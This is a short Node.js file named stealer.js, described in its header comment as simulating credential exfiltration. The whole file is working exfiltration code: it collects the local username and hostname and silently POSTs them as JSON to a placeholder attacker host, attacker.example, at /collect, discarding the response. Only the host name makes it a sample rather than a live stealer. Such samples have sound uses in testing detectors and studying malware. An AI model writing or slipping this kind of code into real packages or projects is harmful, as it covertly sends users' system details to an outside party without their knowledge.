/**
 * stealer.js
 * Simulates credential exfiltration behaviour
 */

const os = require("os");
const https = require("https");

const username = os.userInfo().username;
const hostname = os.hostname();

const payload = JSON.stringify({
  user: username,
  host: hostname
});

const options = {
  hostname: "attacker.example",
  port: 443,
  path: "/collect",
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "Content-Length": payload.length
  }
};

const req = https.request(options, res => {
  // silently ignore response
});

req.write(payload);
req.end();
